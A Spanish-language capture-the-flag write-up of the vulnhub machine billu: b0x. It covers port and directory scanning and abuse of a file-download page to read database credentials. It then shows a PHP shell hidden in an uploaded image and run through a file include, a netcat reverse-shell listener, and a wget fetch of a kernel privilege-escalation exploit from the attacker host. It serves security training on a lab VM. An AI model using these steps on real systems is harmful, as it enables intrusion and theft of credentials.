
Title: CTF - billu: b0x
Date: 08/06/2017
Category: CTF
Tags: CTF, Writeup, Boot2Root
Author: Xose
Summary: Writeup del Boot2Root billu: b0x, máquina virtual descargada de [vulnhub](https://www.vulnhub.com/entry/billu-b0x,188/).
# - boot2root

Bueno, pues como siempre empezamos con un netdiscover para sacar la IP de la máquina, en este caso el netdiscover nos indica que la IP es la 192.168.56.107

Hacemos un nmap para ver los servicios:

```bash
root@kali:~# nmap -v -T4 -A -p- 192.168.56.107

Starting Nmap 7.40 ( https://nmap.org ) at 2017-06-06 19:46 CEST
NSE: Loaded 143 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:46
Completed NSE at 19:46, 0.00s elapsed
Initiating NSE at 19:46
Completed NSE at 19:46, 0.00s elapsed
Initiating ARP Ping Scan at 19:46
Scanning 192.168.56.107 [1 port]
Completed ARP Ping Scan at 19:46, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:46
Completed Parallel DNS resolution of 1 host. at 19:46, 0.01s elapsed
Initiating SYN Stealth Scan at 19:46
Scanning 192.168.56.107 [65535 ports]
Discovered open port 22/tcp on 192.168.56.107
Discovered open port 80/tcp on 192.168.56.107
Completed SYN Stealth Scan at 19:46, 0.60s elapsed (65535 total ports)
Initiating Service scan at 19:46
Scanning 2 services on 192.168.56.107
Completed Service scan at 19:47, 6.22s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 192.168.56.107
NSE: Script scanning 192.168.56.107.
Initiating NSE at 19:47
Completed NSE at 19:47, 0.35s elapsed
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
Nmap scan report for 192.168.56.107
Host is up (0.00037s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 fa:cf:a2:52:c4:fa:f5:75:a7:e2:bd:60:83:3e:7b:de (DSA)
|   2048 88:31:0c:78:98:80:ef:33:fa:26:22:ed:d0:9b:ba:f8 (RSA)
|_  256 0e:5e:33:03:50:c9:1e:b3:e7:51:39:a4:4a:10:64:ca (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: --==[[IndiShell Lab]]==--
MAC Address: 08:00:27:1C:31:B1 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.6
Uptime guess: 198.839 days (since Sat Nov 19 22:39:08 2016)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.37 ms 192.168.56.107

NSE: Script Post-scanning.
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.13 seconds
           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)
```

Dos simples puertos, el 22 para ssh y el 80 de http, una curiosidad es que las versiones del ssh y el apache son algo antiguas, por lo que me pongo a buscar exploits o vulerabilidades a explotar, pero solo encuentro algunas que no nos sirven por ahora.

Como es normal, vamos a ver lo que nos esconde ese puerto 80, abrimos el navegador y nos encontramos con esta página:


![Web](images/billu/web1.png)

Como se puede ver, tenemos un formulario de login con un texto que nos reta a hacer SQL inject, así que intento hacer SQLI al formulario primero por sqlmap y luego manualmente, pero no lo consigo. Mientras leo información sobre SQLI y que podría usar, hago un dirb con common.txt a ver si saca algo:

```bash
root@kali:~/Escritorio/pirates# dirb http://192.168.56.107

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Jun  6 20:24:23 2017
URL_BASE: http://192.168.56.107/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.107/ ----
+ http://192.168.56.107/add (CODE:200|SIZE:307)                                                                                                                        
+ http://192.168.56.107/c (CODE:200|SIZE:1)                                                                                                                            
+ http://192.168.56.107/cgi-bin/ (CODE:403|SIZE:290)                                                                                                                   
+ http://192.168.56.107/head (CODE:200|SIZE:2793)                                                                                                                      
==> DIRECTORY: http://192.168.56.107/images/                                                                                                                           
+ http://192.168.56.107/in (CODE:200|SIZE:47552)                                                                                                                       
+ http://192.168.56.107/index (CODE:200|SIZE:3267)                                                                                                                     
+ http://192.168.56.107/index.php (CODE:200|SIZE:3267)                                                                                                                 
+ http://192.168.56.107/panel (CODE:302|SIZE:2469)                                                                                                                     
+ http://192.168.56.107/server-status (CODE:403|SIZE:295)                                                                                                              
+ http://192.168.56.107/show (CODE:200|SIZE:1)                                                                                                                         
+ http://192.168.56.107/test (CODE:200|SIZE:72)                                                                                                                        
                                                                                                                                                                       
---- Entering directory: http://192.168.56.107/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Tue Jun  6 20:24:24 2017
DOWNLOADED: 4612 - FOUND: 11
```

Voy entrando en las páginas hasta que en test.php encuentro esto:

![Test](images/billu/test1.png)

curioso, nos indica que el parámetro file está vacío, y que proporcionemos una ruta de archivo en el parámetro. Lo intento por GET poniendo “?file=(ruta a una imagen de la web)”, pero sigue saliendo lo mismo, por lo que en vez de por GET, abro mi owasp mantra y pongo el parámetro por post:

![Test](images/billu/test2.png)

¡Funciona!  esta página lo que hace es descargarnos el archivo que hemos puesto en el parámetro file, en este caso nos descarga index.php y podemos ver su contenido. (aquí he tenido un fallo muy tonto, en realidad podría haber acabado el CTF aquí mismo, al final lo explicaré).

![index](images/billu/index.png)

Como podéis ver en la captura de index.php, se hace un include de c.php y hay una variable de conexión a la BBDD sql, así que con la misma página test.php descargo c.php y compruebo que en efecto tenemos ahí los datos de conexión a la BBDD sql, usuario, contraseña y tabla.

![index](images/billu/c.png)
```
$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");
``` 

Tenemos los datos de conexión a la base de datos, pero el dirb no nos ha encontrado ninguna ruta donde esté el phpmyadmin, cosa que sabemos que tiene porqué lo pone en la descripción de la máquina virtual en vulnhub. Mientras pienso como aprovechar estas credenciales, me pongo a examinar el código del index.php y como hacer SQLI pero no saco nada, he estado horas y horas intentándolo pero nada.
Como no se me ocurre que más hacer y estoy estancado, tiro otro dirb, en este caso con big.txt y ¿tachaan! encontramos la ruta del phpmyadmin (a partir de ahora, lanzaré siempre el primer dirb con big.txt).

```bash
root@kali:~# dirb http://192.168.56.107/ /usr/share/wordlists/dirb/big.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Jun  8 13:39:14 2017
URL_BASE: http://192.168.56.107/
WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://192.168.56.107/ ----
+ http://192.168.56.107/add (CODE:200|SIZE:307)                                
+ http://192.168.56.107/c (CODE:200|SIZE:1)                                    
+ http://192.168.56.107/cgi-bin/ (CODE:403|SIZE:290)                           
+ http://192.168.56.107/head (CODE:200|SIZE:2793)                              
==> DIRECTORY: http://192.168.56.107/images/                                   
+ http://192.168.56.107/in (CODE:200|SIZE:47552)                               
+ http://192.168.56.107/index (CODE:200|SIZE:3267)                             
+ http://192.168.56.107/panel (CODE:302|SIZE:2469)                             
==> DIRECTORY: http://192.168.56.107/phpmy/                                    
+ http://192.168.56.107/server-status (CODE:403|SIZE:295)                      
+ http://192.168.56.107/show (CODE:200|SIZE:1)                                 
+ http://192.168.56.107/test (CODE:200|SIZE:72)                                
==> DIRECTORY: http://192.168.56.107/uploaded_images/                                                   
-----------------
END_TIME: Thu Jun  8 13:39:31 2017
DOWNLOADED: 61374 - FOUND: 37

```
(he reducido el resultado del dirb, porqué eran directorios dentro de phpmy que no nos interesan).

Así que accedemos a la ruta phpmy y en efecto es el panel de phpmyadmin, entramos con las credenciales que ya teníamos, vamos a la tabla auth y cogemos el usuario y contraseña que nos servirá para acceder a la página.
usuario: biLLu
contraseña: hEx_it
![bbdd1](images/billu/bbdd1.png)
Entramos con estas credenciales a la página y nos encontramos con un desplegable que tiene dos opciones, show users y add user, show users nos muestra un listado de los usuarios añadidos en la tabla user, y la foto del user subida. add users nos permite añadir un usuario nuevo, poniendo id, nombre dirección y permitiéndonos subir una imagen, este parece nuestro punto de explotación, parece que tendremos que esconder un shell en la imagen.

![show](images/billu/show.png)
![add](images/billu/add.png)

Pues nada, vamos a camuflar un shell en una imagen, lo hago de varias maneras, código guardado como imagen, lo pongo como comment en exif... etc... pero el problema viene al subir la imagen. Como podéis ver en la captura que adjunto con el código de panel.php, nos detecta la extensión del archivo. Nosotros necesitamos que la imagen cargue como php para que funcione el shell por lo que tenemos que guardar la imagen con jpg.php por ejemplo, pero esto no funciona, lo intento de varias maneras, con null byte y todo, pero nada, no funciona. Solo puedo subir y que cargue correctamente si la guardo como .jpg .gif o .png, pero entonces cuando voy a la ruta de la imagen, tan solo carga como imagen y no funciona el código php inyectado.
![panel](images/billu/panel.png)

Revisando cómo funciona el código que tenemos en panel.php me doy cuenta que la parte del continue y load por post es explotable, y podemos hacer include a lo que queramos, incluso se puede hacer directory traversal doblando las '/' para saltarnos el str_replace: (pero tal y como vamos a explotar la máquina, no nos interesa el directory traversal)
![etc](images/billu/etc.png)

Como he dicho, podemos hacer include al fichero que queramos, esto nos ayudará a cargar el código dentro de nuestras imágenes, haciendo pruebas me da por cargar una imagen de las que ya habían subidas en la página por defecto y me encuentro con esto:
![show](images/billu/show2.png)

¡Vaya!  parece que ya hay una imagen con código insertado y carga correctamente el php interno, como soy un vago aprovecho esa imagen, la descargo abro el burpsuite con el intercept activado y subo de nuevo esa imagen como otro usuario, pero cambio el código php que tiene insertado por un shell simple:

![show](images/billu/shell.png)

Lo pruebo, y funciona a la perfección:

![show](images/billu/shell2.png)

Por lo que subo un reverse shell bueno, cargo la página, escucho desde mi máquina y… ¿ya estamos dentro!

![show](images/billu/shell3.png)

```bash
root@kali:~# nc -nvlp 444
listening on [any] 444 ...
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.107] 40267
Linux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
 21:33:25 up  4:33,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@indishell:/$ 
```

Por el kernel y la versión de ubuntu, la máquina debería ser vulnerable al privilege escalation 'overlayfs'. Descargo el exploit de [exploit-db](https://www.exploit-db.com/exploits/37292/), lo subo a la máquina, ejecuto...  ¡ya somos root! máquina completada!

```bash
www-data@indishell:/tmp$ wget http://192.168.56.1:8081/37292.c
wget http://192.168.56.1:8081/37292.c
--2017-06-08 21:40:36--  http://192.168.56.1:8081/37292.c
Connecting to 192.168.56.1:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5123 (5.0K) [text/plain]
Saving to: `37292.c'

100%[======================================>] 5,123       --.-K/s   in 0s      

2017-06-08 21:40:36 (937 MB/s) - `37292.c' saved [5123/5123]

www-data@indishell:/tmp$ ls
ls
37292.c
www-data@indishell:/tmp$ gcc 37292.c -o ofs
gcc 37292.c -o ofs
www-data@indishell:/tmp$ ls
ls
37292.c  ofs
www-data@indishell:/tmp$ ./ofs	
./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data) 
# whoami
whoami
root
```


PD: Como he dicho antes, había una forma mucho más rápida de acabar la máquina, pero hasta que no he leído otro writeup de esta máquina no me he dado cuenta. En el paso en el que testeábamos con test.php podríamos haber visto que también nos permitía cargar archivos del sistema, si ubiese puesto en file /etc/passwd nos lo habría descargado, pues en uno de los archivos de configuración de Apache se encontraban unas credenciales de root que nos permitían haber conectado por ssh.